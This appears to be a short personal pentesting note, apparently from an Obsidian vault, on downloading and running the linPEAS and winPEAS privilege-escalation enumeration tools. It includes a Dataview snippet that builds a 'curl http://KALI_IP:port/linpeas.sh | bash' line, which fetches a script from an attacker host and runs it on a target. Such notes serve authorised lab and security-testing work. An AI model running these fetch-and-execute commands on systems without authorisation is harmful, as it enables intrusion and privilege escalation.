https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

Directly execute into bash without downloading anyt
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `curl http://${KaliIP}:[portno]/linpeas.sh | bash`;

dv.paragraph("```bash\n" + command + "\n```");
```

WinPEAS

```
wget https://github.com/peass-ng/PEASS-ng/releases/download/20260212-43b28429/winPEASx64.exe
```

```cmd
winPEASx64.exe
```